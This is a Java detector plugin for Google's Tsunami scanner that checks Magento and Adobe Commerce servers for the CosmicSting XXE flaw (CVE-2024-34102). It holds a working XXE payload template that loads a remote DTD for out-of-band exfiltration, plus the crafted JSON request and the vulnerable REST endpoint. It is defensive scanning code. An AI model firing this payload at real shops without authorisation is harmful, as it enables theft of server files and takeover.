/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202434102;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.JsonObject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.cves.cve202434102.Annotations.OobSleepDuration;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A Tsunami plugin that detects the CosmicSting XXE in Adobe Commerce and Magento */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Magento & Adobe Commerce CosmicSting XXE (CVE-2024-34102)",
    version = "0.1",
    description =
        "This plugin detects the CosmicSting XXE vulnerability in Magento and Adobe Commerce.",
    author = "Savino Sisco (savio@doyensec.com)",
    bootstrapModule = MagentoCosmicStingXxeBootstrapModule.class)
public final class MagentoCosmicStingXxe implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE-2024-34102";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "Magento & Adobe Commerce CosmicSting XXE (CVE-2024-34102)";

  static final String VULNERABILITY_REPORT_DESCRIPTION_BASIC =
      "The scanner detected a Magento or Adobe Commerce instance vulnerable to the CosmicSting XXE"
          + " (CVE-2024-34102). The vulnerability can be exploited by sending an unauthenticated"
          + " HTTP request with a crafted XML file that references external entities; when the"
          + " request payload is deserialized, the attacker can extract sensitive files from the"
          + " system and gain administrative access to the software. Remote Code Execution (RCE)"
          + " could be accomplished by combining the issue with another vulnerability, such as the"
          + " PHP iconv RCE. See: https://nvd.nist.gov/vuln/detail/CVE-2024-34102 or"
          + " https://helpx.adobe.com/security/products/magento/apsb24-40.html for more"
          + " information.\n";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION_CALLBACK =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed via an Out of Band Callback.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION_RESPONSE_MATCHING =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed via response matching only, as the Tsunami Callback"
          + " Server was not available.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION =
      "Install the latest security patches and rotate your encryption keys. More detailed"
          + " instructions can be found in the official Adobe security bulletin:"
          + " https://helpx.adobe.com/security/products/magento/apsb24-40.html.";

  static final String DTD_FILE_URL =
      "https://raw.githubusercontent.com/doyensec/tsunami-security-scanner-plugins/magento-cosmicsting-xxe/payloads/magento-cosmicsting-xxe/dtd.xml";
  private static final String PAYLOAD_TEMPLATE =
      "<?xml version=\"1.0\" ?>\n"
          + "<!DOCTYPE r [\n"
          + "    <!ELEMENT r ANY >\n"
          + "    <!ENTITY % oob \"{OOB_CALLBACK}\">\n"
          + "    <!ENTITY % sp SYSTEM \"{DTD_FILE}\">\n"
          + "    %sp;\n"
          + "    %param1;\n"
          + "]>\n"
          + "<r>&exfil;</r>";

  @VisibleForTesting
  static final String VULNERABLE_ENDPOINT_PATH =
      "rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final int oobSleepDuration;
  private boolean responseMatchingOnly = false;
  private String detectedMagentoVersion = null;

  @Inject
  MagentoCosmicStingXxe(
      @UtcClock Clock utcClock,
      HttpClient httpClient,
      PayloadGenerator payloadGenerator,
      @OobSleepDuration int oobSleepDuration) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  // This is the main entry point of VulnDetector.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("MagentoCosmicStingXxe starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private String detectMagentoVersion(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "magento_version";
    logger.atInfo().log("Trying to detect Magento version at '%s'", targetUri);

    HttpRequest req = HttpRequest.get(targetUri).withEmptyHeaders().build();

    try {
      HttpResponse response = this.httpClient.send(req, networkService);
      if (response.status() == HttpStatus.OK
          && response.bodyString().orElse("").contains("Magento")) {
        String version = response.bodyString().get();
        logger.atInfo().log("Detected Magento version: '%s'", version);
        return version;
      } else {
        logger.atInfo().log("Unable to detect Magento version.");
        return null;
      }

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to query '%s'.", targetUri);
      return null;
    }
  }

  private String ensureCorrectUrlFormat(String domainOrUrl) {
    if (domainOrUrl.startsWith("http://") || domainOrUrl.startsWith("https://")) {
      return domainOrUrl;
    } else {
      return "http://" + domainOrUrl;
    }
  }

  private String getJsonPayload(String xxePayload) {
    /* JSON payload format:
      {
        "address": {
          "totalsReader": {
            "collectorList": {
              "totalCollector": {
                "sourceData": {
                  "data": payload,
                  "options": 16
                }
              }
            }
          }
        }
      }
    */

    // Build the JSON object containing the XXE payload
    JsonObject sourceData = new JsonObject();
    sourceData.addProperty("data", xxePayload);
    sourceData.addProperty("options", 16);

    JsonObject totalCollector = new JsonObject();
    totalCollector.add("sourceData", sourceData);

    JsonObject collectorList = new JsonObject();
    collectorList.add("totalCollector", totalCollector);

    JsonObject totalsReader = new JsonObject();
    totalsReader.add("collectorList", collectorList);

    JsonObject address = new JsonObject();
    address.add("totalsReader", totalsReader);

    JsonObject jsonPayload = new JsonObject();
    jsonPayload.add("address", address);

    return jsonPayload.toString();
  }

  // Sends the payload and returns True if the response matches the pattern of a vulnerable instance
  private boolean sendPayload(NetworkService networkService, String jsonPayload) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VULNERABLE_ENDPOINT_PATH;
    logger.atInfo().log("Sending XXE payload to '%s'", targetUri);

    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(jsonPayload))
            .build();

    try {
      HttpResponse response = this.httpClient.send(req, networkService);
      // Check if the response matches any known values
      if (response.status() == HttpStatus.INTERNAL_SERVER_ERROR
          && response
              .bodyString()
              .orElse("")
              .startsWith(
                  "{\"message\":\"Internal Error. Details are available in Magento log file.")) {
        logger.atInfo().log(
            "HTTP response received with status code 500 (Internal Server Error): the instance"
                + " should be vulnerable.");
        return true;
      } else if (response.status() == HttpStatus.BAD_REQUEST
          && response.bodyString().orElse("").equals("{\"message\":\"Invalid data type\"}")) {
        logger.atInfo().log(
            "HTTP response received with status code 400 (Bad Request): the instance seems to be"
                + " patched.");
        return false;
      } else {
        logger.atInfo().log(
            "Response does not match any known responses. Status code: %s (%s).",
            response.status().code(), response.status().name());
        return false;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to query '%s'.", targetUri);
      return false;
    }
  }

  // Checks whether a given Magento instance is exposed and vulnerable.
  private boolean isServiceVulnerable(NetworkService networkService) {
    // Fetch the version of the running Magento instance
    this.detectedMagentoVersion = detectMagentoVersion(networkService);

    // Generate the payload for the callback server
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build();

    String oobCallbackUrl = "";
    Payload payload = null;

    // Check if the callback server is available, fallback to response matching if not
    try {
      payload = this.payloadGenerator.generate(config);
      // Use callback for RCE confirmation and raise severity on success
      if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
        logger.atWarning().log(
            "Tsunami Callback Server not available: detector will use response matching only.");
        responseMatchingOnly = true;
      } else {
        oobCallbackUrl = ensureCorrectUrlFormat(payload.getPayload());
      }
    } catch (NotImplementedException e) {
      responseMatchingOnly = true;
    }

    // Build the XML XXE payload
    // Note: when the callback server is not available, oobCallbackUrl will be an empty string.
    // This is fine, as in that case we only care about the HTTP response, the contents of the
    // payload don't really matter.
    String xxePayload =
        PAYLOAD_TEMPLATE
            .replace("{OOB_CALLBACK}", oobCallbackUrl)
            .replace("{DTD_FILE}", DTD_FILE_URL);

    // Wrap the XXE payload in a JSON object
    String jsonPayload = getJsonPayload(xxePayload);

    // Send the malicious HTTP request
    boolean responseMatchingVulnerable = sendPayload(networkService, jsonPayload);

    // No need to wait for the callback when the callback server is not available
    if (responseMatchingOnly) {
      if (responseMatchingVulnerable) {
        logger.atInfo().log("Vulnerability confirmed via response matching.");
      }
      return responseMatchingVulnerable;
    }

    logger.atInfo().log("Waiting for XXE callback.");
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));

    // payload should never be null here as we should have already returned in that case
    assert payload != null;
    if (payload.checkIfExecuted()) {
      logger.atInfo().log("Vulnerability confirmed via Callback Server.");
      return true;
    } else if (responseMatchingVulnerable) {
      logger.atWarning().log(
          "HTTP response seems vulnerable, but no callback was received. Other mitigations may have"
              + " been applied.");
      return false;
    } else {
      logger.atInfo().log(
          "Callback not received and response does not match vulnerable instance, instance is not"
              + " vulnerable.");
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    // Set the additional details section to the detected Magento version
    String additionalDetails;
    if (this.detectedMagentoVersion == null) {
      additionalDetails = "Could not detect Magento version.";
    } else {
      additionalDetails = "Magento version: " + detectedMagentoVersion;
    }

    // Set description and severity depending on whether the vulnerability was verified via an OOB
    // callback or with response matching only
    String description;
    Severity severity;
    if (this.responseMatchingOnly) {
      description = VULNERABILITY_REPORT_DESCRIPTION_RESPONSE_MATCHING;
      severity = Severity.HIGH;
    } else {
      description = VULNERABILITY_REPORT_DESCRIPTION_CALLBACK;
      severity = Severity.CRITICAL;
    }

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(severity)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(description)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION)
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setTextData(TextData.newBuilder().setText(additionalDetails))))
        .build();
  }
}